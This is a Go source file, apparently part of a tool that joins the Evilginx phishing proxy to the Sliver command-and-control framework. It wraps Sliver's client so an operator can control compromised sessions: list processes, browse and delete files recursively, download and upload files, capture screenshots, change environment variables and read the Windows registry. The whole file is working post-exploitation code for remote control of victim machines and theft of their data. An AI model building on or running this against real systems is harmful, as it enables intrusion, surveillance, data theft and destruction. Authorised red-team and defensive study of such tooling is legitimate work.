package evilginx

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	defaultRPCTimeout = int64(60)
	maxDownloadBytes  = 200 * 1024 * 1024 // 200 MB guard for JSON transport
)

// SessionPs - list processes running on a session.
func (s *SliverBridge) SessionPs(sessionID string) ([]ProcessSummary, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := c.Ps(context.Background(), &sliverpb.PsReq{
		FullInfo: true,
		Request:  s.req(sessionID),
	})
	if err != nil {
		return nil, err
	}
	out := make([]ProcessSummary, 0, len(resp.Processes))
	for _, p := range resp.Processes {
		out = append(out, ProcessSummary{
			PID:          p.Pid,
			PPID:         p.Ppid,
			Executable:   p.Executable,
			Owner:        p.Owner,
			Architecture: p.Architecture,
			CmdLine:      p.CmdLine,
		})
	}
	return out, nil
}

// SessionPwd - current working directory of the session.
func (s *SliverBridge) SessionPwd(sessionID string) (string, error) {
	c, err := s.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := c.Pwd(context.Background(), &sliverpb.PwdReq{Request: s.req(sessionID)})
	if err != nil {
		return "", err
	}
	return resp.Path, nil
}

// SessionCd - change the session working directory (returns the new path).
func (s *SliverBridge) SessionCd(sessionID, path string) (string, error) {
	c, err := s.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := c.Cd(context.Background(), &sliverpb.CdReq{Path: path, Request: s.req(sessionID)})
	if err != nil {
		return "", err
	}
	return resp.Path, nil
}

// SessionFileList - list directory entries at path.
func (s *SliverBridge) SessionFileList(sessionID, path string) (*FileList, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := c.Ls(context.Background(), &sliverpb.LsReq{Path: path, Request: s.req(sessionID)})
	if err != nil {
		return nil, err
	}
	out := &FileList{Path: resp.Path, Exists: resp.Exists}
	for _, f := range resp.Files {
		out.Files = append(out.Files, FileEntry{
			Name:    f.Name,
			IsDir:   f.IsDir,
			Size:    f.Size,
			ModTime: f.ModTime,
			Mode:    f.Mode,
			Link:    f.Link,
			Uid:     f.Uid,
			Gid:     f.Gid,
		})
	}
	return out, nil
}

// SessionMkdir - create a directory on the session.
func (s *SliverBridge) SessionMkdir(sessionID, path string) error {
	c, err := s.requireClient()
	if err != nil {
		return err
	}
	_, err = c.Mkdir(context.Background(), &sliverpb.MkdirReq{Path: path, Request: s.req(sessionID)})
	return err
}

// SessionRm - remove a file or directory (optionally recursive).
func (s *SliverBridge) SessionRm(sessionID, path string, recursive bool) error {
	c, err := s.requireClient()
	if err != nil {
		return err
	}
	_, err = c.Rm(context.Background(), &sliverpb.RmReq{
		Path:      path,
		Recursive: recursive,
		Force:     recursive,
		Request:   s.req(sessionID),
	})
	return err
}

// SessionMv - rename/move a path on the session.
func (s *SliverBridge) SessionMv(sessionID, src, dst string) error {
	c, err := s.requireClient()
	if err != nil {
		return err
	}
	_, err = c.Mv(context.Background(), &sliverpb.MvReq{Src: src, Dst: dst, Request: s.req(sessionID)})
	return err
}

// SessionDownload - fetch a file from the session (raw bytes).
func (s *SliverBridge) SessionDownload(sessionID, path string) (*DownloadResult, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := c.Download(context.Background(), &sliverpb.DownloadReq{
		Path:    path,
		MaxBytes: maxDownloadBytes,
		Request: s.req(sessionID),
	})
	if err != nil {
		return nil, err
	}
	if !resp.Exists {
		return nil, fmt.Errorf("remote path does not exist: %s", path)
	}
	out := &DownloadResult{
		Path:   resp.Path,
		Data:   resp.Data,
		IsDir:  resp.IsDir,
		ReadFiles:   int(resp.ReadFiles),
		Unreadable:  int(resp.UnreadableFiles),
	}
	if resp.IsDir {
		out.Name = "archive_" + resp.Path
	}
	return out, nil
}

// SessionUpload - write a file to the session.
func (s *SliverBridge) SessionUpload(sessionID, remotePath, fileName string, data []byte, overwrite bool) error {
	c, err := s.requireClient()
	if err != nil {
		return err
	}
	if len(data) > maxDownloadBytes {
		return fmt.Errorf("upload payload exceeds size guard (%d bytes)", maxDownloadBytes)
	}
	_, err = c.Upload(context.Background(), &sliverpb.UploadReq{
		Path:      remotePath,
		FileName:  fileName,
		Data:      data,
		Overwrite: overwrite,
		Request:   s.req(sessionID),
	})
	return err
}

// SessionScreenshot - capture the session desktop (raw image bytes).
func (s *SliverBridge) SessionScreenshot(sessionID string) (*ScreenshotResult, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := c.Screenshot(context.Background(), &sliverpb.ScreenshotReq{Request: s.req(sessionID)})
	if err != nil {
		return nil, err
	}
	return &ScreenshotResult{Data: resp.Data}, nil
}

// SessionEnv - list environment variables of the session.
func (s *SliverBridge) SessionEnv(sessionID string) ([]EnvVar, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := c.GetEnv(context.Background(), &sliverpb.EnvReq{Request: s.req(sessionID)})
	if err != nil {
		return nil, err
	}
	out := make([]EnvVar, 0, len(resp.Variables))
	for _, v := range resp.Variables {
		out = append(out, EnvVar{Key: v.Key, Value: v.Value})
	}
	return out, nil
}

// SessionSetEnv - set an environment variable on the session.
func (s *SliverBridge) SessionSetEnv(sessionID, key, value string) error {
	c, err := s.requireClient()
	if err != nil {
		return err
	}
	_, err = c.SetEnv(context.Background(), &sliverpb.SetEnvReq{
		Variable: &commonpb.EnvVar{Key: key, Value: value},
		Request:  s.req(sessionID),
	})
	return err
}

// SessionUnsetEnv - remove an environment variable from the session.
func (s *SliverBridge) SessionUnsetEnv(sessionID, key string) error {
	c, err := s.requireClient()
	if err != nil {
		return err
	}
	_, err = c.UnsetEnv(context.Background(), &sliverpb.UnsetEnvReq{Name: key, Request: s.req(sessionID)})
	return err
}

// SessionRegistryRead - read a registry value from a Windows session.
func (s *SliverBridge) SessionRegistryRead(sessionID, hive, path, key string) (string, error) {
	c, err := s.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := c.RegistryRead(context.Background(), &sliverpb.RegistryReadReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: s.req(sessionID),
	})
	if err != nil {
		return "", err
	}
	return resp.Value, nil
}

// --- typed summaries ---

type ProcessSummary struct {
	PID          int32    `json:"pid"`
	PPID         int32    `json:"ppid"`
	Executable   string   `json:"executable"`
	Owner        string   `json:"owner"`
	Architecture string   `json:"architecture"`
	CmdLine      []string `json:"cmd_line"`
}

type FileEntry struct {
	Name    string `json:"name"`
	IsDir   bool   `json:"is_dir"`
	Size    int64  `json:"size"`
	ModTime int64  `json:"mod_time"`
	Mode    string `json:"mode"`
	Link    string `json:"link"`
	Uid     string `json:"uid"`
	Gid     string `json:"gid"`
}

type FileList struct {
	Path   string      `json:"path"`
	Exists bool        `json:"exists"`
	Files  []FileEntry `json:"files"`
}

type DownloadResult struct {
	Path      string `json:"path"`
	Name      string `json:"name"`
	IsDir     bool   `json:"is_dir"`
	ReadFiles int    `json:"read_files"`
	Unreadable int   `json:"unreadable"`
	Data      []byte `json:"data"`
}

type ScreenshotResult struct {
	Data []byte `json:"data"`
}

type EnvVar struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

func (s *SliverBridge) req(sessionID string) *commonpb.Request {
	return &commonpb.Request{SessionID: sessionID, Timeout: defaultRPCTimeout}
}